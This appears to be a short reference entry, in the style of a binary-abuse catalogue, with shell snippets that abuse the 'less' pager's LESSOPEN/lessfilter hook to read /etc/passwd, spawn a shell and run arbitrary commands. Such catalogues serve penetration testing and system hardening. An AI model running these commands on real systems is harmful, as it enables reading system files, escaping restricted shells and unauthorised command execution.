file-read.description: This can read arbitrary files by creating a custom lessfilter script.
file-read.code:
echo '#!/bin/bash
cat "$1"
exit 0' > ~/.lessfilter
chmod +x ~/.lessfilter
export LESSOPEN="|~/.lessfilter %s"
less /etc/passwd

shell.description: This can spawn an interactive shell by executing commands through lessfilter.
shell.code:
echo '#!/bin/bash
/bin/bash
exit 0' > ~/.lessfilter
chmod +x ~/.lessfilter
export LESSOPEN="|~/.lessfilter %s"
less anyfile

command.description: This executes arbitrary commands through the lessfilter mechanism.
command.code:
echo '#!/bin/bash
COMMAND
exit 0' > ~/.lessfilter
chmod +x ~/.lessfilter
export LESSOPEN="|~/.lessfilter %s"
less anyfile
